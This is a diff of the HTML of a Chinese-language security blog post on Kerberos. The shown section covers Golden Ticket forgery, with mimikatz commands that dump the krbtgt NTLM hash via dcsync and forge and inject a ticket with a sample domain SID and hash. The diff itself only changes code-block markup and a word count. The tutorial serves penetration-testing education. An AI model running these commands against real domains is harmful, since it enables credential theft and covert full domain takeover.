@@ -63,7 +63,7 @@
         "description": "目前域环境中使用的认证协议基本都是 Kerberos ，所以把 Kerberos 协议理解透彻对域渗透来说极其重要。 图片来自： http://web.mit.edu/kerberos/ 0x01 Kerberos 协议简化描述 上面的图片就是 Kerberos 的 logo ，形象为三个狗头，正好符合 Kerberos 协议……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  2371 ,
+        "wordCount":  2364 ,
         "image": ["https://oss.zjun.info/zjun.info/UsgRjNOfKrpAWPk.webp","https://oss.zjun.info/zjun.info/7UptSByn4RarV8b.webp","https://oss.zjun.info/zjun.info/3.webp","https://oss.zjun.info/zjun.info/uFHzxmCnGAbjM7J.webp","https://oss.zjun.info/zjun.info/4.webp","https://oss.zjun.info/zjun.info/5.webp","https://oss.zjun.info/zjun.info/6.webp","https://oss.zjun.info/zjun.info/7.webp","https://oss.zjun.info/zjun.info/8.webp","https://oss.zjun.info/zjun.info/9.webp","https://oss.zjun.info/zjun.info/10.webp","https://oss.zjun.info/zjun.info/11.webp","https://oss.zjun.info/zjun.info/12.webp"],
         "publisher": {
             "@type": "Organization",
@@ -417,35 +417,16 @@
 <h2 id="0x04-黄金票据-golden-ticket-伪造"><a href="#0x04-黄金票据-golden-ticket-伪造" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:0x04-黄金票据-golden-ticket-伪造" class="headings">0x04 黄金票据 Golden Ticket 伪造</a></h2>
 <p>黄金票据伪造的是 <code>TGT</code> ，是一个任意服务的认证凭据。</p>
 <p>伪造黄金票据最主要得是需要获得 <code>krbtgt</code> 用户的 <code>NTLM hash</code> ，在拿下域控后可以抓取 <code>kerbtgt</code> 的 <code>NTLM hash</code> ：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe log <span class="s2">&#34;lsadump::dcsync /domain:zjun.com /user:krbtgt&#34;</span> <span class="nb">exit</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/10.webp" alt="10"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe log <span class="s2">&#34;lsadump::dcsync /domain:zjun.com /user:krbtgt&#34;</span> <span class="nb">exit</span>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/10.webp" alt="10"></p>
 <p>然后便可容易在域内其他主机或可以访问到域的主机上伪造黄金票据：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerberos::golden /admin:administrator /domain:zjun.com /sid:S-1-5-21-3446166583-1116429469-1279190574 /krbtgt:66ad458513450343d7625cd1bc6f7262 /ptt
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerberos::golden /admin:administrator /domain:zjun.com /sid:S-1-5-21-3446166583-1116429469-1279190574 /krbtgt:66ad458513450343d7625cd1bc6f7262 /ptt
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">/admin：伪造的任意用户名
 </span></span><span class="line"><span class="cl">/domain：域名称
 </span></span><span class="line"><span class="cl">/sid：域 SID
 </span></span><span class="line"><span class="cl">/krbtgt：krbtgt 用户的 NTLM <span class="nb">hash</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/11.webp" alt="11"></p>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/11.webp" alt="11"></p>
 <p>可以很隐蔽的控制整个域环境。</p>
 <p><img src="https://oss.zjun.info/zjun.info/12.webp" alt="12"></p>
 
